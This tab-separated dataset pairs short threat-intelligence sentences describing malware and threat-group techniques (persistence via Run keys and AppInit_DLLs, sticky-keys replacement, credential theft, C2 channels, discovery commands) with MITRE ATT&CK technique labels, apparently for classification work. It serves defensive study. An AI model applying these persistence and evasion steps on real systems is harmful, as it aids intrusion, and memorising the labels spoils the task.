text1	labels
removes logs from /var/logs and /Library/logs.	['T1070']
renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.	['T1036']
replaces the Sticky Keys binary C:\Windows\System32\sethc.exe for persistence.	['T1546.008']
reports window names along with keylogger information to provide application context.	['T1010']
Rundll32.exe is used as a way of executing  at the command-line.	['T1218.011']
runs cmd.exe /c and sends the output to its C2.	['T1059']
runs ipconfig /all and collects the domain name.	['T1016']
runs its core DLL file using rundll32.exe.	['T1218.011']
runs tasklist to obtain running processes.	['T1057']
runs tests to determine the privilege level of the compromised user.	['T1033']
runs the command: net start >> %TEMP%\info.dat on a victim.	['T1007']
runs the command net user on a victim.  also runs tests to determine the privilege level of the compromised user.	['T1087']
runs the ifconfig command to obtain the IP address from the victim’s machine.	['T1016']
runs the net view /domain and net view commands.	['T1018']
runs the net view command	['T1018']
runs the whoami and query user commands.	['T1033']
runs whoami on the victim’s machine.	['T1033']
samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32.	['T1546.015']
samples have been signed with a code-signing certificates.	['T1553.002']
samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.	['T1553.002']
samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.	['T1027.002']
samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.	['T1553.002']
samples were timestomped by the authors by setting the PE timestamps to all zero values.  also has a built-in command to modify file times.	['T1070.006']
saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .	['T1119']
saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.	['T1036']
"saves itself with a leading ""."" so that it's hidden from users by default."	['T1564.001']
scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).	['T1518.001']
scans processes on all victim systems in the environment and uses automated scripts to pull back the results.	['T1064', 'T1119']
scans the C-class subnet of the IPs on the victim's interfaces.	['T1018']
schedules the execution one of its modules by creating a new scheduler task.	['T1053.005']
scripts save memory dump data into a specific directory on hosts in the victim environment.	['T1074']
searches attached and mounted drives for file extensions and keywords that match a predefined list.	['T1083']
searches for certain Registry keys to be configured before executing the payload.	['T1012']
searches for files created within a certain timeframe and whose file extension matches a predefined list.	['T1083']
searches for files named logins.json to parse for credentials and also looks for credentials stored from browsers.	['T1552.001']
searches for files on attached removable drives based on a predefined list of file extensions every five seconds.	['T1025']
searches for files on local drives based on a predefined list of file extensions.	['T1005']
searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by .	['T1025']
searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.	['T1083']
searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.	['T1114']
searches for network drives and removable media and duplicates itself onto them.	['T1105']
searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.	['T1114']
searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.	['T1119']
searches the local system and gathers data.	['T1005']
searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip	['T1083']
searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).	['T1114']
searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.	['T1083']
SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.	['T1550.002']
sends an OS version identifier in its beacons.	['T1082']
sends emails to victims with a malicious executable disguised as a document or spreadsheet displaying a fake icon.	['T1598.002']
sends images to users that are embedded with shellcode and obfuscates strings and payloads.	['T1027']
sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.	['T1082']
sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.	['T1598.002']
sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.	['T1598.003']
sent spear phishing emails containing links to .hta files.	['T1598.003']
sent spearphishing emails containing malicious Microsoft Office attachments.	['T1598.002']
sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.	['T1598.003']
service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.	['T1546.009']
service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.	['T1083']
sets a WH_CBT Windows hook to collect information on process creation.	['T1057']
sets a WH_CBT Windows hook to search for and capture files on the victim.	['T1083']
sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.	['T1070.006']
Several  backdoors achieved persistence by adding a Run key.	['T1547.001']
Several  malware families are capable of downloading and executing binaries from its C2 server.	['T1105']
Several  malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.	['T1082']
Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic.  malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.	['T1573']
Several  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.	['T1070.006']
Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.	['T1083']
Several  tools encode data with base64 when posting it to a C2 server.	['T1132']
shellcode decrypts and decompresses its RC4-encrypted payload.	['T1140']
side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.	['T1574.002']
Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.	['T1043']
Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.	['T1571']
Some  malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.	['T1026']
Some resources in  are encrypted with a simple XOR operation or encoded with Base64.	['T1027']
Some  samples contain a publicly available Web browser password recovery tool.	['T1003']
Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.	['T1078', 'T1114']
Some  samples have a module to use pass the ticket with Kerberos for authentication.	['T1550.003']
Some  samples install themselves as services for persistence by calling WinExec with the net start argument.	['T1543.003']
Some  samples use a custom encryption method for C2 traffic using AES, base64 encoding, and multiple keys.	['T1573']
Some  samples use AES to encrypt C2 traffic.	['T1573']
Some  samples use cmd.exe to delete temporary files.	['T1070.004']
Some  samples were signed with a stolen digital certificate.	['T1553.002']
Some strings in are obfuscated with XOR x56.	['T1027']
Some  variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.	['T1071']
Some variants of  achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.	['T1546.015']
"Some variants of  use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll"""	['T1546.010']
Some variants of  use SSL to communicate with C2 servers.	['T1071']
Some  variants use HTTP for C2.	['T1071']
Some  variants use ports 8080 and 8000 for C2.	['T1043']
Some  variants use raw TCP for C2.	['T1095']
Some  variants use SSL to encrypt C2 communications.	['T1573']
Some  versions have an embedded DLL known as MockDll that uses  and regsvr32 to execute another payload.	['T1218.010']
Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.	['T1055.012']
Some versions of  have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.	['T1573']
spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.	['T1055.012']
spearphished victims via Facebook and Whatsapp.	['T1566.003']
spear phishing campaigns have included malicious Word documents with DDE execution.	['T1559.002']
specifically looks for Domain Admins, Power Users, and the Administrators groups within the domain and locally	['T1069']
splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.	['T1030']
stages command output and collected data in files before exfiltration.	['T1074']
stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.	['T1074']
steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).	['T1003']
steals credentials from its victims.	['T1003']
steals credentials stored in Web browsers by querying the sqlite database and leveraging the Windows Vault mechanism.	['T1003']
steals data stored in the clipboard.	['T1115']
steals files based on an extension list if a USB drive is connected to the system.	['T1025']
steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.	['T1005']
steals user files from local hard drives with file extensions that match a predefined list.	['T1005']
steals user files from network shared drives with file extensions and keywords that match a predefined list.	['T1039']
stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.	['T1547.001']
stores configuration values under the Registry key HKCU\Software\Microsoft\[dllname] and modifies Registry keys under HKCR\CLSID\...\InprocServer32with a path to the launcher.	['T1112']
stores information gathered from the endpoint in a file named 1.hwp.	['T1074']
stores itself in ~/Library/.DS_Stores/	['T1564.001']
stores output from command execution in a .dat file in the %TEMP% directory.	['T1074']
stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentContorlSet\Control\WMI\Security.	['T1112']
supports execution from the command-line.	['T1059']
"supports file encryption (AES with the key ""lolomycin2017"")."	['T1027']
surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.	['T1049']
surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.	['T1083']
surveys a system upon check-in to discover information in the Windows Registry with the reg query command.	['T1012']
surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, and net config commands.	['T1016']
surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.	['T1082']
surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.	['T1018']
surveys a system upon check-in to discover the system time by using the net time command.	['T1124']
takes screenshots of the compromised system's desktop and saves them to C:\system\screenshot.bmp for exfiltration every 60 minutes.	['T1113']
terminates anti-malware processes if they’re found running on the system.	['T1562.001']
The 's Information Gathering Tool (IGT) includes PowerShell components.	['T1059.001']
"The ""SCOUT"" variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key."	['T1547.001']
"The ""tDiscoverer"" variant of  establishes a C2 channel by downloading resources from Web services like Twitter and GitHub.  binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day."	['T1102']
"The ""Uploader"" variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands."	['T1071']
"The ""ZR"" variant of  will check to see if known host-based firewalls are installed on the infected systems.  will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed."	['T1562.001']
The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.	['T1547.009', 'T1547.001']
The  backdoor compresses communications using the standard Zlib compression library.	['T1560']
The  C2 channel uses an 11-byte XOR algorithm to hide data.	['T1573']
The  C2 channel uses HTTP POST requests.	['T1071']
The C2 server response to a beacon sent by a variant of  contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of  use various XOR operations to encrypt C2 data.	['T1573']
The  client has been signed by fake and invalid digital certificates.	['T1553.002']
The  command and control protocol's data stream can be encrypted with AES-CBC.	['T1573']
The  component KillDisk is capable of deleting Windows Event Logs.	['T1070']
The  config file is encrypted with RC4.	['T1027']
The  crimeware toolkit has refined its detection of sandbox analysis environments by inspecting the process list and Registry.	['T1518.001']
The discovery modules used with  can collect information on accounts and permissions.	['T1087']
The discovery modules used with  can collect information on network connections.	['T1049']
The discovery modules used with  can collect information on process details.	['T1057']
The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.	['T1070.004']
The  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  component.	['T1218.011']
The  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.	['T1036']
The  dropper uses a function to obfuscate the name of functions and other parts of the malware.	['T1027']
The  dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.	['T1047']
The executable version of  has a module to log keystrokes.	['T1056']
The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by  as a name for malware.	['T1036']
The  group has been known to compress data before exfiltration.	['T1560']
The  group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate. Some malware that has been used by  also uses steganography to hide communication in PNG image files.	['T1001']
The  group is known to utilize WMI for lateral movement.	['T1047']
The initial beacon packet for  contains the operating system version and file system of the victim.	['T1082']
The initial beacon packet for  contains the operating system version of the victim.	['T1082']
The  installer loads a DLL using rundll32.	['T1218.011']
The  loader implements itself with the name Security Support Provider, a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.	['T1036']
The  malware communicates through the use of events in Google Calendar.	['T1102']
The  malware communicates to its command server using HTTP with an encrypted payload.	['T1071']
The  malware platform can use ICMP to communicate between infected computers.	['T1095']
The  malware platform can use Windows admin shares to move laterally.	['T1021.002']
The  malware supports timestomping.	['T1070.006']
The net accounts and net accounts /domain commands with  can be used to obtain password policy information.	['T1201']
The net time command can be used in  to determine the local or remote system time.	['T1124']
The net user username \password and net user username \password \domain commands in  can be used to create a local or domain account respectively.	['T1136']
The OsInfo function in  collects a running process list.	['T1057']
The OsInfo function in  collects the current running username.	['T1033']
The  payload is stored in a hidden directory at /Users/Shared/.local/kextd.	['T1564.001']
The payload of  is encrypted with simple XOR with a rotating key. The  configuration file has been encrypted with RC4 keys.	['T1027']
The  RAT has a keylogger.	['T1056']
The reconnaissance modules used with  can collect information on network configuration.	['T1016']
There is a variant of  that uses a PowerShell script instead of the traditional PE form.	['T1059.001']
The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.	['T1105']
The  trojan supports file deletion.	['T1070.004']
The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.	['T1070.004']
"To establish persistence,  adds a Registry Run key with a value ""TaskMgr"" in an attempt to masquerade as the legitimate Windows Task Manager."	['T1036']
To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.	['T1547.009', 'T1036', 'T1547.001']
tools attempt to spoof anti-virus processes as a means of self-defense.	['T1036']
tools contained an application to check performance of USB flash drives.	['T1120']
Traffic traversing the  network will be forwarded to multiple nodes before exiting the  network and continuing on to its intended destination.	['T1090.003']
transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.	['T1041']
transfers files from the compromised host via HTTP or HTTPS to a C2 server.	['T1071']
"tries to add a Registry Run key under the name ""Windows Update"" to establish persistence."	['T1547.001']
tries to add a scheduled task to establish persistence.	['T1053.005']
TRINITY malware used by  identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\Windows\. Once the malware collects the data,  actors compressed data and moved it to another staging system before exfiltration.	['T1074']
typically use ping and  to enumerate systems.	['T1018']
uploads and downloads information.	['T1105']
uploads data in 2048-byte chunks.	['T1030']
uploads files and secondary payloads to the victim's machine.	['T1105']
used a cloud-based remote access software called LogMeIn for their attacks.	['T1219']
used a cron job for persistence on Mac devices.	['T1053']
used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.	['T1033']
used a rootkit to modify typical server functionality.	['T1014']
used a SharePoint enumeration and data dumping tool known as spwebmember.	['T1213']
used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.	['T1083']
used Base64 to encode C2 traffic.	['T1132']
used Base64 to obfuscate commands and the payload.	['T1027']
used batch scripts to enumerate network information, including information about trusts, zones, and the domain.	['T1016']
used batch scripts to enumerate users in the victim environment.	['T1087']
used cmd.exe to launch commands on the victim’s machine.	['T1059']
used command line for execution.	['T1059']
used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.	['T1102']
used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.	['T1220']
used PowerShell scripts for execution.	['T1059.001']
used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.	['T1018', 'T1046']
used RDP to move laterally in victim networks.	['T1021.001']
used regsvr32.exe to execute scripts.	['T1218.010']
used Regsvr32 to bypass application whitelisting techniques.	['T1218.010']
used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.	['T1053.005']
used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as  use a blend of HTTP and other legitimate channels, depending on module configuration.	['T1071']
used spearphishing emails with malicious Microsoft Word attachments to infect victims.	['T1598.002']
used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.	['T1598.003']
used sticky-keys to obtain unauthenticated, privileged console access.	['T1546.008']
used the Ammyy Admin tool as well as TeamViewer for remote access.	['T1219']
used the Plink command-line utility to create SSH tunnels to C2 servers.	['T1573', 'T1071']
used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.	['T1036']
used  to download payloads, run a reverse shell, and execute malware on the victim's machine.	['T1059.001']
used  to launch an authentication window for users to enter their credentials.	['T1187']
used  to remove artifacts from victims.	['T1070']
used UPX to pack files.	['T1027.002']
used various social media channels to spearphish victims.	['T1566.003']
used VBS and JavaScript scripts to help perform tasks on the victim's machine.	['T1064']
used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.	['T1133']
use HTTPS for all command and control communication methods.	['T1071']
uses 's malleable C2 functionality to blend in with network traffic.	['T1095']
uses 443 for C2 communications.	['T1043']
uses a backup communication method with an HTTP beacon.	['T1008']
uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.	['T1547.001']
uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.	['T1112']
uses a batch file to kill a security program task and then attempts to remove itself.	['T1064']
uses a batch file to load a DLL into the svchost.exe process.	['T1055']
uses a command-line interface.	['T1059']
uses a command-line interface to interact with systems.	['T1059']
uses a copy of tor2web proxy for HTTPS communications.	['T1090.003']
uses a custom binary protocol for C2 communications.	['T1095']
uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.	['T1095']
uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.	['T1043', 'T1071']
uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.	['T1043']
uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.	['T1573']
uses a custom DNS tunneling protocol for C2.	['T1095']
uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.	['T1573']
uses a custom encryption algorithm on data sent back to the C2 server over HTTP.	['T1573']
uses a customized XOR algorithm to encrypt C2 communications.	['T1573']
uses a custom packer.	['T1027.002']
uses a custom packing algorithm.	['T1027.002']
uses a custom TCP protocol for C2.	['T1095']
uses a custom UDP protocol to communicate.	['T1095']
uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.	['T1553.002']
uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.	['T1140']
uses AES to encrypt C2 communications.	['T1573']
uses AES to encrypt certain information sent over its C2 channel.	['T1573']
uses AES to encrypt network communication.	['T1573']
uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.	['T1074', 'T1564.001']
uses a keylogger and steals clipboard contents from victims.	['T1056']
uses a keylogger plugin to gather keystrokes.	['T1056']
uses a keylogger to capture keystrokes.	['T1056']
uses a keylogger to capture keystrokes and location of where the user is typing.	['T1056']
uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.	['T1056']
uses a large list of C2 servers that it cycles through until a successful connection is established.	['T1008']
uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.	['T1110']
uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.	['T1047']
uses a module to execute Mimikatz with PowerShell to perform .	['T1064', 'T1059.001']
uses a module to receive a notification every time a USB mass storage device is inserted into a victim.	['T1120']
uses  and other Active Directory utilities to enumerate hosts.	['T1018']
uses a Port 22 malware variant to modify several Registry keys.	['T1112']
uses a PowerShell script to launch shellcode that retrieves an additional payload.	['T1059.001']
uses AppleScript to create a login item for persistence.	['T1059.002']
uses a simple one-byte XOR method to obfuscate values in the malware.	['T1027']
uses a sophisticated keylogger.	['T1056']
uses a specific port of 443 and can also use ports 53 and 80 for C2. One  variant uses HTTP over port 443 to connect to its C2 server.	['T1043']
uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.	['T1091']
uses a variation of the XOR cipher to encrypt files before exfiltration.	['T1486']
uses a virus that propagates by infecting executables stored on shared drives.	['T1080']
uses a WMI event subscription to establish persistence.	['T1546.003']
uses Base64 encoding for C2 traffic.	['T1132']
uses Base64 encoding for communication in the message body of an HTTP request.	['T1132']
uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.	['T1102']
uses character replacement,  environment variables, and XOR encoding to obfuscate code.	['T1027']
uses cloud based services for C2.	['T1102']
uses cmd.exe and /bin/bash to execute commands on the victim’s machine.	['T1059']
uses cmd.exe to execute commands for discovery.	['T1059']
uses cmd.exe to execute commands on the victim’s machine.	['T1059']
uses cmd.exe to execute scripts and commands on the victim’s machine.	['T1059']
uses cmd.exe to run commands for enumerating the host.	['T1059']
uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.	['T1059']
uses COM hijacking as a method of persistence.	['T1546.015']
uses command line for execution.	['T1059']
uses commands such as netsh advfirewall firewall to discover local firewall settings.	['T1518.001']
uses commands such as netsh interface show to discover network interface settings.	['T1016']
uses credential dumpers such as  and  to extract cached credentials from Windows systems.	['T1003']
uses custom base64 encoding to obfuscate HTTP traffic.	['T1132']
uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.	['T1574.001']
uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.	['T1574.002']
uses DLL side-loading to load malicious programs.	['T1574.002']
uses DNS as its C2 protocol.	['T1071']
uses DNS for C2.	['T1071']
uses DNS for the C2 communications.	['T1071']
uses DNS TXT records for C2.	['T1071']
uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended desitnation.	['T1090.004']
uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.	['T1027']
uses FakeTLS to communicate with its C2 server.	['T1573']
uses fake Transport Layer Security (TLS) to communicate with its C2 server, encoding data with RC4 encryption.	['T1573']
uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.	['T1036']
uses FTP for command and control.	['T1071']
uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.	['T1071']
uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.	['T1008']
uses HTTP, HTTPS, FTP, and FTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.	['T1071']
uses HTTP and HTTPS for C2.	['T1071']
uses HTTP and HTTPS for command and control.	['T1071']
uses HTTP and HTTPS to communicate with the C2 server.	['T1071']
uses HTTP as a transport to communicate with its command server.	['T1071']
uses HTTP for C2.	['T1071']
uses HTTP for C2 communication.	['T1071']
uses HTTP for C2 communications.	['T1071']
uses HTTP for command and control communication.	['T1071']
uses HTTP for communication to the control servers.	['T1071']
uses HTTP for communication with the C2 server.	['T1071']
uses HTTP or HTTPS for C2.	['T1071']
uses HTTP over SSL to communicate commands with the control server.	['T1071']
uses HTTP POST requests with data formatted using a custom protocol.	['T1095']
uses HTTPS, HTTP, and DNS for C2 communications.	['T1071']
uses HTTPS for C2.	['T1071']
uses HTTPS for C2 communications.	['T1071']
uses HTTPS for command and control.	['T1071']
uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.	['T1071']
uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.	['T1043']
uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.	['T1071']
uses ipconfig /all and route PRINT to identify network adapter and interface information.	['T1016']
uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, and CVE-2015-1641.	['T1203']
uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server. It has also obfuscated its C2 traffic as normal traffic to sites such as Github.	['T1102']
uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.	['T1104']
uses mshta.exe to load its program and files.	['T1218.005']
uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.	['T1008']
uses multiple techniques to obfuscate strings, including XOR.	['T1027']
uses netstat -ano to search for specific IP address ranges.	['T1049']
uses Pastebin to store its real C2 addresses.	['T1102']
uses port 443 for C2.	['T1043']
uses port 443 for C2 communications.	['T1043']
uses port 46769 for C2.	['T1571']
uses port 8000 and 443 for C2.	['T1043']
uses port 8080 for C2.	['T1043']
uses port 80 for C2.	['T1043']
uses Port Numbers 443 and 80 for the C2 server.	['T1043']
uses ports 447 and 8082 for C2 communications.	['T1571']
uses ports 80, 443, and 8080 for C2.	['T1043']
uses PowerShell for execution.	['T1059.001']
uses PowerShell scripts for execution.	['T1059.001']
uses PowerShell to add a Registry Run key in order to establish persistence.	['T1547.001']
uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.	['T1087']
uses public sites such as github.com and sendspace.com to upload files and then download them to victim computers.	['T1105']
uses Putty and VNC for lateral movement.	['T1021']
uses RC4 and Base64 to obfuscate strings.	['T1027']
uses RC4 encryption to obfuscate HTTP traffic.	['T1573']
uses RC4 to encrypt C2 traffic.	['T1573']
uses RC4 to encrypt the message body of HTTP content.	['T1573']
uses RDP to tunnel traffic from a victim environment.	['T1071']
uses reflective DLL injection to inject the malicious library and execute the RAT.	['T1055']
uses reg add to add a Registry Run key for persistence.	['T1112']
uses remote services such as VPN, Citrix, or OWA to persist in an environment.	['T1133']
uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.	['T1218.011']
uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”.	['T1218.011']
uses rundll32.exe to load its DLL.	['T1218.011']
uses Rundll32 for executing the dropper program.	['T1218.011']
uses rundll32 to call an exported function.	['T1218.011']
uses Rundll32 to ensure only a single instance of itself is running at once.	['T1218.011']
uses Rundll32 to load a malicious DLL.	['T1218.011']
